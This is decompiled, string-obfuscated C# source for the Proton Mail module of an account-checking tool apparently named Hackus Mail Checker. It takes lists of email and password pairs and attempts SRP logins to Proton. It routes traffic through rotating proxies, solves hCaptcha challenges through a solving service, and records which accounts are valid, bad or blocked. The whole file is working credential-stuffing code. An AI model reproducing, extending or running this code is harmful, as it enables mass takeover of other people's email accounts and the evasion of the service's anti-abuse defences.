using System;
using System.Text.RegularExpressions;
using System.Threading;
using Hackus_Mail_Checker_Reforged.Helpers;
using Hackus_Mail_Checker_Reforged.Models;
using Hackus_Mail_Checker_Reforged.Models.Enums;
using Hackus_Mail_Checker_Reforged.Net.Web.Proton;
using Hackus_Mail_Checker_Reforged.Net.Web.Proton.GoSrp;
using Hackus_Mail_Checker_Reforged.Services.Managers;
using Hackus_Mail_Checker_Reforged.Services.Settings;
using Newtonsoft.Json;
using xNet;

namespace Hackus_Mail_Checker_Reforged.Net
{
	// Token: 0x020000AB RID: 171
	public class ProtonClient
	{
		// Token: 0x17000135 RID: 309
		// (get) Token: 0x06000572 RID: 1394 RVA: 0x00006D62 File Offset: 0x00004F62
		private SearchSettings SearchSettings
		{
			get
			{
				return SearchSettings.Instance;
			}
		}

		// Token: 0x06000573 RID: 1395 RVA: 0x00009BD9 File Offset: 0x00007DD9
		public ProtonClient(Mailbox mailbox)
		{
			this._mailbox = mailbox;
		}

		// Token: 0x06000574 RID: 1396 RVA: 0x00021724 File Offset: 0x0001F924
		public void Handle()
		{
			if (this._mailbox.Address == null)
			{
				return;
			}
			OperationResult operationResult = this.Login();
			StatisticsManager.Instance.Increment(operationResult);
			FileManager.SaveStatistics(this._mailbox.Address, this._mailbox.Password, operationResult);
			if (operationResult == OperationResult.Ok && !SearchSettings.Instance.Search)
			{
				MailManager.Instance.AddResult(new MailboxResult(this._mailbox));
			}
		}

		// Token: 0x06000575 RID: 1397 RVA: 0x00021794 File Offset: 0x0001F994
		private OperationResult Login()
		{
			int num = 0;
			for (;;)
			{
				this.Reset();
				OperationResult operationResult = this.GetAuthInfo();
				if (operationResult == OperationResult.Error)
				{
					return operationResult;
				}
				if (operationResult != OperationResult.HttpError)
				{
					operationResult = this.Authenticate(null);
					if (operationResult == OperationResult.Captcha)
					{
						if (WebSettings.Instance.SolveCaptcha && !string.IsNullOrEmpty(WebSettings.Instance.CaptchaSolvationKey))
						{
							OperationResult siteKey = this.GetSiteKey();
							if (siteKey == OperationResult.Error)
							{
								return OperationResult.Captcha;
							}
							if (siteKey == OperationResult.HttpError)
							{
								continue;
							}
							ValueTuple<OperationResult, string> valueTuple = CaptchaHelpers.CreateInstance().SolveHCaptcha(this._siteKey, <Module>.smethod_2<string>(1490708811), <Module>.smethod_5<string>(1482021352));
							OperationResult item = valueTuple.Item1;
							string item2 = valueTuple.Item2;
							if (item == OperationResult.Error)
							{
								break;
							}
							if (item == OperationResult.HttpError)
							{
								continue;
							}
							operationResult = this.Authenticate(item2);
						}
						else
						{
							if (num <= 3)
							{
								num++;
								continue;
							}
							return OperationResult.Captcha;
						}
					}
					if (operationResult != OperationResult.HttpError)
					{
						return operationResult;
					}
				}
			}
			return OperationResult.Captcha;
		}

		// Token: 0x06000576 RID: 1398 RVA: 0x00021868 File Offset: 0x0001FA68
		private OperationResult GetAuthInfo()
		{
			this.WaitPause();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					httpRequest.AddHeader(<Module>.smethod_6<string>(-452519608), <Module>.smethod_2<string>(941257502));
					httpRequest.AddHeader(<Module>.smethod_6<string>(890714211), <Module>.smethod_2<string>(2023840275));
					httpRequest.AddHeader(<Module>.smethod_2<string>(225883637), <Module>.smethod_5<string>(-1793646419));
					httpRequest.AddHeader(<Module>.smethod_2<string>(-1155904558), <Module>.smethod_3<string>(-81245960));
					string text = <Module>.smethod_4<string>(-1450036325) + this._mailbox.Address + <Module>.smethod_2<string>(-1185720978);
					string input = httpRequest.Post(<Module>.smethod_6<string>(-1330641654), text, <Module>.smethod_4<string>(-423852883)).ToString();
					Match match = Regex.Match(input, <Module>.smethod_4<string>(-1817916597));
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					this._modulus = match.Groups[1].Value.Replace(<Module>.smethod_3<string>(780725584), <Module>.smethod_6<string>(-1253514038));
					match = Regex.Match(input, <Module>.smethod_4<string>(-1377299533));
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					this._srpSession = match.Groups[1].Value;
					match = Regex.Match(input, <Module>.smethod_4<string>(375552085));
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					this._salt = match.Groups[1].Value;
					match = Regex.Match(input, <Module>.smethod_6<string>(-1780794096));
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					this._serverEphemeral = match.Groups[1].Value;
					this._goProofs = GoSrpInvoker.GenerateProofs(4, this._mailbox.Address, this._mailbox.Password, this._salt, this._modulus, this._serverEphemeral, 2048);
					if (this._goProofs == null)
					{
						return OperationResult.Error;
					}
					return OperationResult.Ok;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000577 RID: 1399 RVA: 0x00021ADC File Offset: 0x0001FCDC
		private OperationResult Authenticate(string token = null)
		{
			this.WaitPause();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					httpRequest.AddHeader(<Module>.smethod_2<string>(-1163952921), <Module>.smethod_3<string>(-223744174));
					httpRequest.AddHeader(<Module>.smethod_2<string>(-57001940), <Module>.smethod_4<string>(564300540));
					httpRequest.AddHeader(<Module>.smethod_4<string>(-1977815138), <Module>.smethod_6<string>(1928384819));
					httpRequest.AddHeader(<Module>.smethod_3<string>(138019134), <Module>.smethod_6<string>(727706079));
					if (token != null)
					{
						httpRequest.AddHeader(<Module>.smethod_6<string>(1923195464), <Module>.smethod_5<string>(-418286942));
						httpRequest.AddHeader(<Module>.smethod_6<string>(2070939898), this._humanVerificationToken + <Module>.smethod_4<string>(-1213116943) + this._sendToken + token);
					}
					string text = JsonConvert.SerializeObject(new
					{
						ClientEphemeral = this._goProofs.ClientEphemeral,
						ClientProof = this._goProofs.ClientProof,
						SRPSession = this._srpSession,
						Username = this._mailbox.Address
					});
					string text2 = httpRequest.Post(<Module>.smethod_6<string>(739510207), text, <Module>.smethod_4<string>(-423852883)).ToString();
					if (text2.Contains(<Module>.smethod_5<string>(-991717833)))
					{
						Match match = Regex.Match(text2, <Module>.smethod_4<string>(-1198167716));
						if (match.Success)
						{
							this._humanVerificationToken = match.Groups[1].Value;
						}
						return OperationResult.Captcha;
					}
					if (text2.ContainsOne(new string[]
					{
						<Module>.smethod_2<string>(176924102),
						<Module>.smethod_5<string>(1023833071)
					}))
					{
						return OperationResult.Bad;
					}
					if (text2.ContainsOne(new string[]
					{
						<Module>.smethod_2<string>(875978122),
						<Module>.smethod_3<string>(-140996569),
						<Module>.smethod_2<string>(-122281320),
						<Module>.smethod_2<string>(-1920237958),
						<Module>.smethod_2<string>(160604257)
					}))
					{
						return OperationResult.Blocked;
					}
					if (!text2.ContainsOne(new string[]
					{
						<Module>.smethod_4<string>(-147418409),
						<Module>.smethod_3<string>(-1224359054),
						<Module>.smethod_2<string>(27321391)
					}))
					{
						return OperationResult.Error;
					}
					return OperationResult.Ok;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000578 RID: 1400 RVA: 0x00021D70 File Offset: 0x0001FF70
		private OperationResult GetSiteKey()
		{
			this.WaitPause();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					httpRequest.AddUrlParam(<Module>.smethod_2<string>(1275826720), this._humanVerificationToken);
					httpRequest.AddUrlParam(<Module>.smethod_3<string>(751880135), 1);
					string input = httpRequest.Get(<Module>.smethod_5<string>(-1947435358), null).ToString();
					Match match = Regex.Match(input, <Module>.smethod_4<string>(400205687));
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					this._siteKey = match.Groups[1].Value;
					match = Regex.Match(input, <Module>.smethod_2<string>(-1596565164));
					if (match.Success)
					{
						this._sendToken = match.Groups[1].Value + match.Groups[2].Value;
						return OperationResult.Ok;
					}
					return OperationResult.Error;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000579 RID: 1401 RVA: 0x00021E94 File Offset: 0x00020094
		private void SetHeaders(HttpRequest request)
		{
			request.IgnoreProtocolErrors = true;
			request.ConnectTimeout = CheckerSettings.Instance.Timeout * 1000;
			request.Cookies = this._cookies;
			request.Proxy = this._proxyClient;
			request.UserAgent = <Module>.smethod_2<string>(900569449);
		}

		// Token: 0x0600057A RID: 1402 RVA: 0x00009BE8 File Offset: 0x00007DE8
		private void Reset()
		{
			this._cookies = new CookieDictionary(false);
			if (ProxySettings.Instance.UseProxy)
			{
				this._proxyClient = ProxyManager.Instance.GetProxy();
			}
		}

		// Token: 0x0600057B RID: 1403 RVA: 0x00009AC8 File Offset: 0x00007CC8
		private void WaitPause()
		{
			ThreadsManager.Instance.WaitHandle.WaitOne();
		}

		// Token: 0x040002DC RID: 732
		private Mailbox _mailbox;

		// Token: 0x040002DD RID: 733
		private ProxyClient _proxyClient;

		// Token: 0x040002DE RID: 734
		private CookieDictionary _cookies;

		// Token: 0x040002DF RID: 735
		private string _modulus;

		// Token: 0x040002E0 RID: 736
		private string _srpSession;

		// Token: 0x040002E1 RID: 737
		private string _salt;

		// Token: 0x040002E2 RID: 738
		private string _serverEphemeral;

		// Token: 0x040002E3 RID: 739
		private GoProofs _goProofs;

		// Token: 0x040002E4 RID: 740
		private string _humanVerificationToken;

		// Token: 0x040002E5 RID: 741
		private string _siteKey;

		// Token: 0x040002E6 RID: 742
		private string _sendToken;
	}
}
